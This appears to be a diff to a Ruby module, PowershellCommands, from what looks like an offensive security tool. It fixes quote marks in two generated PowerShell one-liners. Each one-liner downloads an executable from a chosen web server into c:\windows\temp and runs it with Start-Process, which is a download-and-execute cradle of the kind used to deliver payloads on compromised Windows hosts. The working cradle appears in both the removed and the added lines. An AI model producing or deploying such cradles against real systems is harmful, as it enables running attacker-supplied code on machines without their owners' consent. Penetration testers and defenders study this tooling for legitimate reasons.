@@ -20,9 +20,9 @@ module PowershellCommands
     user_pick = Readline.readline("#{get_input("Would you like to add an argument?[yes/no] ")}",true)
     if user_pick == 'yes'
       arguments = Readline.readline("#{get_input("Input the argument: ")}",true)
-      powershell_command = %($arg='#{arguments}';$web=new-object System.Net.WebClient;$web.DownloadFile('http://#{web_server}/#{executable}', c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable} $arg")
+      powershell_command = %($arg='#{arguments}';$web=new-object System.Net.WebClient;$web.DownloadFile('http://#{web_server}/#{executable}', 'c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable} $arg)
     else
-      powershell_command = %($web=new-object System.Net.WebClient;$web.DownloadFile('http://#{web_server}/#{executable}', c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable}")
+      powershell_command = %($web=new-object System.Net.WebClient;$web.DownloadFile('http://#{web_server}/#{executable}', 'c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable})
     end
     return powershell_command
   end
